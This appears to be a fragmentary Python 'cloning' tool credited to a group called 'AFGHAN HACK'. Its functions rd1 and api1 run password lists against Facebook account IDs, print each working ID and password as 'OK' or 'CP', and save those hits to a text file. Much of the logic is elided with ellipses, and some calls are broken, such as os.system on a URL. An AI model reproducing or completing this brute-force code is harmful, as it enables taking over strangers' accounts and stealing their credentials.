...
TEAM :  AFGHAN HACK
BROTHER ❤️:Alparsalan XD Nasrat
Facebook :Shah Zadah
...
def Main_ZIDI():
        ...
        if shm =='1':
            ...
            os.system('https://www.facebook.com/profile.php?id=100088392859656')
            Main_ZIDI()
        elif shm =='0':
...
def afg():
    ...
    linex()
    input(' [+] Press enter to back ')
    os.system('python Karwantech77.py')
#[=]======RANDOM CLONING METHOD======[=]#
def rd1(ids,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write('\r [ALPARSALAN]  %s|  OK:-%s '%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        file_path = os.path.join(folder_path, 'ALPARSALANP-CP.txt')
...
def api1(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    uid = str(po['uid'])
                    print('\r\r\033[1;32m [ALPARSALAN-OK] '+uid+' | '+pas)
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r\r\33[1m\33[1;35m [alparsalan-CP] '+uid+' | '+pas+'\033[1;97m')
